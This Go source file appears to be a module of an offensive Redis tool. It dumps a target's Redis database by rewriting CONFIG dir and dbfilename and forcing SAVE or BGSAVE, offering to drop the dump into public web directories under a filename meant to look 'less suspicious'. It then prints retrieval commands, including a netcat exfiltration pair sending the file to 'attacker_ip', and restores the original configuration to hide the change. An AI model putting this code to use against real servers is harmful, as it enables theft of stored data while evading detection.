package analysis

import (
	"0xRedisis/modules/core"
	"bufio"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"
)

func DatabaseDump(client *core.RedisClient) {
	fmt.Printf("\n%s=== Database Dump ===%s\n", core.ColorBlue, core.ColorNC)

	// Get current Redis configuration
	dir, err := client.SendCommand("CONFIG", "GET", "dir")
	if err != nil {
		fmt.Printf("%s[-]%s Failed to get Redis directory: %s\n", core.ColorRed, core.ColorNC, err.Error())
		return
	}

	dbfilename, err := client.SendCommand("CONFIG", "GET", "dbfilename")
	if err != nil {
		fmt.Printf("%s[-]%s Failed to get database filename: %s\n", core.ColorRed, core.ColorNC, err.Error())
		return
	}

	currentDir := parseConfigValue(dir, "dir")
	currentFilename := parseConfigValue(dbfilename, "dbfilename")

	fmt.Printf("%s[*]%s Current Redis directory: %s%s%s\n",
		core.ColorBlue, core.ColorNC, core.ColorYellow, currentDir, core.ColorNC)
	fmt.Printf("%s[*]%s Current database filename: %s%s%s\n",
		core.ColorBlue, core.ColorNC, core.ColorYellow, currentFilename, core.ColorNC)

	// Show database info first
	showDatabaseInfo(client)

	// Show dump options
	fmt.Printf("\n%s[*]%s Database Dump Options:\n", core.ColorBlue, core.ColorNC)
	fmt.Printf("%s1.%s Quick dump (use current location)\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("%s2.%s Custom dump location\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("%s3.%s Dump to accessible web directory\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("%s4.%s Dump with timestamp\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("%s5.%s Background dump (BGSAVE)\n", core.ColorYellow, core.ColorNC)
	fmt.Print("\nEnter your choice (1-5): ")

	reader := bufio.NewReader(os.Stdin)
	choice, _ := reader.ReadString('\n')
	choice = strings.TrimSpace(choice)

	var dumpDir, dumpFilename string

	switch choice {
	case "1":
		dumpDir = currentDir
		dumpFilename = generateDumpFilename()
	case "2":
		dumpDir, dumpFilename = getCustomDumpLocation(reader)
	case "3":
		dumpDir, dumpFilename = getWebDumpLocation(reader)
	case "4":
		dumpDir, dumpFilename = getTimestampedDumpLocation(reader)
	case "5":
		performBackgroundDump(client, reader)
		return
	default:
		fmt.Printf("%s[-]%s Invalid choice\n", core.ColorRed, core.ColorNC)
		return
	}

	// Perform the database dump
	fmt.Printf("\n%s[*]%s Starting database dump...\n", core.ColorBlue, core.ColorNC)

	if err := performDatabaseDump(client, dumpDir, dumpFilename); err != nil {
		fmt.Printf("%s[-]%s Database dump failed: %s\n", core.ColorRed, core.ColorNC, err.Error())
		return
	}

	fullPath := filepath.Join(dumpDir, dumpFilename)
	fmt.Printf("%s[+]%s Database dump completed successfully!\n", core.ColorGreen, core.ColorNC)
	fmt.Printf("%s[+]%s Dump location: %s%s%s\n", core.ColorGreen, core.ColorNC, core.ColorYellow, fullPath, core.ColorNC)

	// Provide retrieval instructions
	showRetrievalInstructions(fullPath, client.Config.Host)

	// Restore original configuration
	fmt.Printf("\n%s[*]%s Restoring original Redis configuration...\n", core.ColorBlue, core.ColorNC)
	restoreRedisConfig(client, currentDir, currentFilename)
}

func showDatabaseInfo(client *core.RedisClient) {
	fmt.Printf("\n%s=== Database Information ===%s\n", core.ColorBlue, core.ColorNC)

	// Get database size
	dbsize, err := client.SendCommand("DBSIZE")
	if err == nil {
		fmt.Printf("%s[*]%s Database size: %s%s keys%s\n",
			core.ColorBlue, core.ColorNC, core.ColorYellow, strings.TrimSpace(dbsize), core.ColorNC)
	}

	// Get memory usage
	info, err := client.SendCommand("INFO", "memory")
	if err == nil {
		usedMemory := core.ExtractInfoValue(info, "used_memory_human")
		fmt.Printf("%s[*]%s Memory usage: %s%s%s\n",
			core.ColorBlue, core.ColorNC, core.ColorYellow, usedMemory, core.ColorNC)
	}

	// Get last save time
	lastsave, err := client.SendCommand("LASTSAVE")
	if err == nil {
		timestamp := strings.TrimSpace(lastsave)
		if timestamp != "0" && timestamp != "" {
			fmt.Printf("%s[*]%s Last save: %s%s%s\n",
				core.ColorBlue, core.ColorNC, core.ColorYellow, timestamp, core.ColorNC)
		}
	}

	// Show sample keys
	keys, err := client.SendCommand("KEYS", "*")
	if err == nil {
		keyList := strings.Split(strings.TrimSpace(keys), "\n")
		if len(keyList) > 0 && keyList[0] != "" {
			fmt.Printf("%s[*]%s Sample keys:\n", core.ColorBlue, core.ColorNC)
			maxShow := 5
			if len(keyList) > maxShow {
				for i := 0; i < maxShow; i++ {
					if strings.TrimSpace(keyList[i]) != "" {
						fmt.Printf("   %s- %s%s\n", core.ColorYellow, keyList[i], core.ColorNC)
					}
				}
				fmt.Printf("   %s... and %d more keys%s\n",
					core.ColorYellow, len(keyList)-maxShow, core.ColorNC)
			} else {
				for _, key := range keyList {
					if strings.TrimSpace(key) != "" {
						fmt.Printf("   %s- %s%s\n", core.ColorYellow, key, core.ColorNC)
					}
				}
			}
		}
	}
}

func generateDumpFilename() string {
	timestamp := time.Now().Format("20060102_150405")
	return fmt.Sprintf("redis_dump_%s.rdb", timestamp)
}

func getCustomDumpLocation(reader *bufio.Reader) (string, string) {
	fmt.Print("Enter dump directory path: ")
	dir, _ := reader.ReadString('\n')
	dir = strings.TrimSpace(dir)

	fmt.Print("Enter dump filename (leave empty for auto-generated): ")
	filename, _ := reader.ReadString('\n')
	filename = strings.TrimSpace(filename)

	if filename == "" {
		filename = generateDumpFilename()
	}

	return dir, filename
}

func getWebDumpLocation(reader *bufio.Reader) (string, string) {
	fmt.Printf("\n%s[*]%s Common web directories:\n", core.ColorBlue, core.ColorNC)
	fmt.Printf("%s1.%s /var/www/html (Apache)\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("%s2.%s /var/www (Apache root)\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("%s3.%s /usr/share/nginx/html (Nginx)\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("%s4.%s /home/www-data (Custom)\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("%s5.%s /opt/lampp/htdocs (XAMPP)\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("%s6.%s /tmp (Temporary)\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("%s7.%s Custom web path\n", core.ColorYellow, core.ColorNC)
	fmt.Print("\nEnter your choice (1-7): ")

	choice, _ := reader.ReadString('\n')
	choice = strings.TrimSpace(choice)

	var webDir string
	switch choice {
	case "1":
		webDir = "/var/www/html"
	case "2":
		webDir = "/var/www"
	case "3":
		webDir = "/usr/share/nginx/html"
	case "4":
		webDir = "/home/www-data"
	case "5":
		webDir = "/opt/lampp/htdocs"
	case "6":
		webDir = "/tmp"
	case "7":
		fmt.Print("Enter custom web path: ")
		customPath, _ := reader.ReadString('\n')
		webDir = strings.TrimSpace(customPath)
	default:
		webDir = "/var/www/html"
	}

	// Use a filename that looks less suspicious in web directory
	timestamp := time.Now().Format("20060102")
	filename := fmt.Sprintf("backup_%s.db", timestamp)

	return webDir, filename
}

func getTimestampedDumpLocation(reader *bufio.Reader) (string, string) {
	fmt.Print("Enter base directory: ")
	baseDir, _ := reader.ReadString('\n')
	baseDir = strings.TrimSpace(baseDir)

	if baseDir == "" {
		baseDir = "/tmp"
	}

	timestamp := time.Now().Format("2006-01-02_15-04-05")
	filename := fmt.Sprintf("redis_dump_%s.rdb", timestamp)

	return baseDir, filename
}

func performBackgroundDump(client *core.RedisClient, reader *bufio.Reader) {
	fmt.Printf("\n%s=== Background Database Dump ===%s\n", core.ColorBlue, core.ColorNC)

	fmt.Print("Enter target directory (leave empty for current): ")
	targetDir, _ := reader.ReadString('\n')
	targetDir = strings.TrimSpace(targetDir)

	if targetDir != "" {
		_, err := client.SendCommand("CONFIG", "SET", "dir", targetDir)
		if err != nil {
			fmt.Printf("%s[-]%s Failed to set directory: %s\n", core.ColorRed, core.ColorNC, err.Error())
			return
		}
	}

	fmt.Printf("%s[*]%s Starting background save (BGSAVE)...\n", core.ColorBlue, core.ColorNC)

	result, err := client.SendCommand("BGSAVE")
	if err != nil {
		fmt.Printf("%s[-]%s BGSAVE failed: %s\n", core.ColorRed, core.ColorNC, err.Error())
		return
	}

	fmt.Printf("%s[+]%s %s\n", core.ColorGreen, core.ColorNC, strings.TrimSpace(result))

	// Monitor background save progress
	if strings.Contains(result, "Background saving started") {
		fmt.Printf("%s[*]%s Monitoring background save progress...\n", core.ColorBlue, core.ColorNC)

		for i := 0; i < 60; i++ { // Monitor for up to 60 seconds
			time.Sleep(1 * time.Second)

			info, err := client.SendCommand("INFO", "persistence")
			if err != nil {
				continue
			}

			if strings.Contains(info, "rdb_bgsave_in_progress:0") {
				fmt.Printf("\n%s[+]%s Background save completed successfully!\n", core.ColorGreen, core.ColorNC)

				lastsave, _ := client.SendCommand("LASTSAVE")
				fmt.Printf("%s[+]%s Last save timestamp: %s\n",
					core.ColorGreen, core.ColorNC, strings.TrimSpace(lastsave))
				break
			}

			if i%5 == 0 {
				fmt.Printf("\r%s[*]%s Still saving... (%d/60)", core.ColorBlue, core.ColorNC, i+1)
			}
		}
	}
}

func performDatabaseDump(client *core.RedisClient, dumpDir, dumpFilename string) error {
	// First, let's see what's in the database
	fmt.Printf("%s[*]%s Analyzing database content...\n", core.ColorBlue, core.ColorNC)

	dbsize, err := client.SendCommand("DBSIZE")
	if err != nil {
		fmt.Printf("%s[!]%s Warning: Could not get database size: %s\n",
			core.ColorYellow, core.ColorNC, err.Error())
	} else {
		fmt.Printf("%s[*]%s Database contains %s keys\n",
			core.ColorBlue, core.ColorNC, strings.TrimSpace(dbsize))
	}

	// Configure Redis to save to target location
	_, err = client.SendCommand("CONFIG", "SET", "dir", dumpDir)
	if err != nil {
		return fmt.Errorf("failed to set directory to %s: %v", dumpDir, err)
	}

	_, err = client.SendCommand("CONFIG", "SET", "dbfilename", dumpFilename)
	if err != nil {
		return fmt.Errorf("failed to set filename to %s: %v", dumpFilename, err)
	}

	// Perform the actual dump using SAVE for immediate save
	fmt.Printf("%s[*]%s Executing synchronous save...\n", core.ColorBlue, core.ColorNC)
	result, err := client.SendCommand("SAVE")
	if err != nil {
		return fmt.Errorf("SAVE command failed: %v", err)
	}

	fmt.Printf("%s[*]%s Redis response: %s\n", core.ColorBlue, core.ColorNC, strings.TrimSpace(result))

	// Verify the save was successful
	lastsave, err := client.SendCommand("LASTSAVE")
	if err == nil {
		fmt.Printf("%s[+]%s Save timestamp: %s\n",
			core.ColorGreen, core.ColorNC, strings.TrimSpace(lastsave))
	}

	return nil
}

func showRetrievalInstructions(fullPath, host string) {
	fmt.Printf("\n%s=== Retrieval Instructions ===%s\n", core.ColorBlue, core.ColorNC)

	// If it's in a web directory, suggest HTTP download
	webDirs := []string{"/var/www", "/usr/share/nginx", "/home/www-data", "/opt/lampp"}
	isWebAccessible := false

	for _, webDir := range webDirs {
		if strings.Contains(fullPath, webDir) {
			isWebAccessible = true
			break
		}
	}

	if isWebAccessible {
		// Try to guess the web URL
		filename := filepath.Base(fullPath)
		fmt.Printf("%s[*]%s Web Download Options:\n", core.ColorBlue, core.ColorNC)
		fmt.Printf("   %swget http://%s/%s%s\n", core.ColorYellow, host, filename, core.ColorNC)
		fmt.Printf("   %scurl -O http://%s/%s%s\n", core.ColorYellow, host, filename, core.ColorNC)
		fmt.Printf("   %sBrowser: http://%s/%s%s\n", core.ColorYellow, host, filename, core.ColorNC)
	}

	fmt.Printf("\n%s[*]%s SCP/SFTP Download Options:\n", core.ColorBlue, core.ColorNC)
	fmt.Printf("   %sscp user@%s:%s ./%s\n", core.ColorYellow, host, fullPath, core.ColorNC)
	fmt.Printf("   %ssftp user@%s:%s%s\n", core.ColorYellow, host, fullPath, core.ColorNC)
	fmt.Printf("   %srsync -av user@%s:%s ./%s\n", core.ColorYellow, host, fullPath, core.ColorNC)

	fmt.Printf("\n%s[*]%s Alternative Methods:\n", core.ColorBlue, core.ColorNC)
	fmt.Printf("   %sBase64 encode and copy: base64 %s%s\n", core.ColorYellow, fullPath, core.ColorNC)
	fmt.Printf("   %sCompress first: tar -czf dump.tar.gz %s%s\n", core.ColorYellow, fullPath, core.ColorNC)

	fmt.Printf("\n%s[*]%s Netcat Transfer:\n", core.ColorBlue, core.ColorNC)
	fmt.Printf("   %s1. On attacker: nc -l -p 1234 > dump.rdb%s\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("   %s2. On target: nc attacker_ip 1234 < %s%s\n", core.ColorYellow, fullPath, core.ColorNC)

	fmt.Printf("\n%s[*]%s Analysis Tools:\n", core.ColorBlue, core.ColorNC)
	fmt.Printf("   %sredis-cli --rdb dump.rdb%s\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("   %srdb --command json %s%s\n", core.ColorYellow, fullPath, core.ColorNC)
}

func restoreRedisConfig(client *core.RedisClient, originalDir, originalFilename string) {
	_, err := client.SendCommand("CONFIG", "SET", "dir", originalDir)
	if err != nil {
		fmt.Printf("%s[!]%s Warning: Failed to restore original directory: %s\n",
			core.ColorYellow, core.ColorNC, err.Error())
	}

	_, err = client.SendCommand("CONFIG", "SET", "dbfilename", originalFilename)
	if err != nil {
		fmt.Printf("%s[!]%s Warning: Failed to restore original filename: %s\n",
			core.ColorYellow, core.ColorNC, err.Error())
	} else {
		fmt.Printf("%s[+]%s Original Redis configuration restored\n", core.ColorGreen, core.ColorNC)
	}
}

func parseConfigValue(response, key string) string {
	lines := strings.Split(response, "\n")
	for i, line := range lines {
		if strings.TrimSpace(line) == key && i+1 < len(lines) {
			return strings.TrimSpace(lines[i+1])
		}
	}
	return "unknown"
}
